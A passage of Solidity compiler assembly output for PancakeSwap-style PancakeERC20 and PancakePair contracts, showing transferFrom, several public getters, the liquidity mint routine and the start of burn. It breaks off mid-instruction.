\"src/exchange-protocol/contracts/PancakeERC20.sol\":3418:3423  value */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3400  allowance[from][msg.sender].sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_188:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3354  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3348  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3354  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3355:3365  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3366  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3437  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3277:3448  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_187:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3483  _transfer(from, to, value) */\n      tag_189\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3467:3471  from */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3473:3475  to */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3477:3482  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3466  _transfer */\n      tag_190\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3483  _transfer(from, to, value) */\n      jump\t// in\n    tag_189:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3500:3504  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_69:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":748:814  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n    tag_71:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":341:343  18 */\n      0x12\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":557:588  bytes32 public DOMAIN_SEPARATOR */\n    tag_73:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n    tag_76:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1047:1079  uint public price0CumulativeLast */\n    tag_78:\n      sload(0x0c)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1085:1117  uint public price1CumulativeLast */\n    tag_80:\n      sload(0x0d)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5025:6290  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_83:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5074:5088  uint liquidity */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_192\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_192:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5143:5156  getReserves() */\n      tag_194\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5143:5154  getReserves */\n      tag_54\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5143:5156  getReserves() */\n      jump\t// in\n    tag_194:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5204:5210  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5230:5234  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5100:5156  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5181:5194  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5204:5210  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5221  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5204:5210  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_195\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_195:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_196\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_196:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_197\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_197:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5269:5275  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5295:5299  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5246:5259  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5269:5275  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5286  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5197:5236  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5269:5275  token1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_198\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_198:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_199\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_199:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_200\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_200:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5262:5301  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5311:5323  uint amount0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5349  balance0.sub(_reserve0) */\n      tag_201\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5334  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5349  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5338  balance0.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5326:5349  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_201:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5311:5349  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5359:5371  uint amount1 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5397  balance1.sub(_reserve1) */\n      tag_202\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5382  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5397  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5386  balance1.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5374:5397  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_202:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5359:5397  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5408:5418  bool feeOn */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5421:5451  _mintFee(_reserve0, _reserve1) */\n      tag_203\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5430:5439  _reserve0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5441:5450  _reserve1 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5421:5429  _mintFee */\n      tag_204\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5421:5451  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_203:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5461:5478  uint _totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5481:5492  totalSupply */\n      sload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5408:5451  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5584:5601  _totalSupply == 0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5580:5974  if (_totalSupply == 0) {... */\n      tag_205\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5683  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_206\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5660  Math.sqrt(amount0.mul(amount1)) */\n      tag_169\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5659  amount0.mul(amount1) */\n      tag_208\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5646  amount0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5651:5658  amount1 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5659  amount0.mul(amount1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5650  amount0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5639:5659  amount0.mul(amount1) */\n      and\n      jump\t// in\n    tag_208:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5638  Math.sqrt */\n      tag_209\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5660  Math.sqrt(amount0.mul(amount1)) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5629:5683  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_206:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5617:5683  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5697:5733  _mint(address(0), MINIMUM_LIQUIDITY) */\n      tag_210\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5711:5712  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5697:5702  _mint */\n      tag_211\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5697:5733  _mint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_210:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5580:5974  if (_totalSupply == 0) {... */\n      jump(tag_212)\n    tag_205:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5831:5963  Math.min(... */\n      tag_213\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5894  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5882  amount0.mul(_totalSupply) */\n      tag_214\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5864  amount0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5869:5881  _totalSupply */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5882  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5868  amount0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5882  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_214:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5857:5894  amount0.mul(_totalSupply) / _reserve0 */\n      dup2\n      tag_215\n      jumpi\n      invalid\n    tag_215:\n      div\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5949  amount1.mul(_totalSupply) / _reserve1 */\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5937  amount1.mul(_totalSupply) */\n      tag_216\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5919  amount1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5924:5936  _totalSupply */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5937  amount1.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5923  amount1.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5937  amount1.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_216:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5912:5949  amount1.mul(_totalSupply) / _reserve1 */\n      dup2\n      tag_217\n      jumpi\n      invalid\n    tag_217:\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5831:5839  Math.min */\n      tag_218\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5831:5963  Math.min(... */\n      jump\t// in\n    tag_213:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5819:5963  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5580:5974  if (_totalSupply == 0) {... */\n    tag_212:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6003:6004  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5991:6000  liquidity */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5991:6004  liquidity > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5983:6047  require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_219\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_219:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6057:6077  _mint(to, liquidity) */\n      tag_220\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6063:6065  to */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6067:6076  liquidity */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6057:6062  _mint */\n      tag_211\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6057:6077  _mint(to, liquidity) */\n      jump\t// in\n    tag_220:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6088:6137  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_221\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6096:6104  balance0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6106:6114  balance1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6116:6125  _reserve0 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6127:6136  _reserve1 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6088:6095  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6088:6137  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_221:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6151:6156  feeOn */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6147:6194  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_222\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6185:6193  reserve1 */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6166:6194  uint(reserve0).mul(reserve1) */\n      tag_223\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6171:6179  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6185:6193  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6166:6194  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6166:6184  uint(reserve0).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6166:6194  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_223:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6158:6163  kLast */\n      0x0e\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6158:6194  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6147:6194  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_222:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6249:6283  Mint(msg.sender, amount0, amount1) */\n      0x40\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup6\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6254:6264  msg.sender */\n      caller\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6249:6283  Mint(msg.sender, amount0, amount1) */\n      0x4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f\n      swap3\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log2\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      sstore\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5025:6290  function mint(address to) external lock returns (uint liquidity) {... */\n      swap5\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n    tag_86:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1123:1140  uint public kLast */\n    tag_88:\n      sload(0x0e)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n    tag_91:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7789:9218  function burn(... */\n    tag_94:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7852:7864  uint amount0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7866:7878  uint amount1 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_225\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_225:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7933:7946  getReserves() */\n      tag_227\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7933:7944  getReserves */\n      tag_54\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7933:7946  getReserves() */\n      jump\t// in\n    tag_227:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7989:7995  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8038:8044  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8119:8123  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      